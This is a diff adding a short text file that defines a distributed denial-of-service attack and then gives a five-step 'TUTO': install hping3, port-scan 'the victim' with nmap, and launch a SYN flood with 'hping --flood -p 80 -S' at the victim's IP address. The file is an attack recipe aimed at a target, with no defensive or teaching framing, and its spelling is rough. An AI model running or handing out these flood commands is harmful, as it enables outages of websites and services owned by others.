@@ -1,0 +1,10 @@
+DDOS = A distributed denial-of-service (DDoS) attack is one of the most powerful weapons on the internet. When you hear about a website being “brought down by hackers,” it generally means it has become a victim of a DDoS attack. In short, this means that hackers have attempted to make a website or computer unavailable by flooding or crashing the website with too much traffic.
+
+
+TUTO : 
+
+1-open terminal
+2-Apt-get install hping3
+3-nmap -p 1-100 "ip adress of the victim"
+4-hping -- help
+5-hping --flood -p 80 -S "victime ip adress"
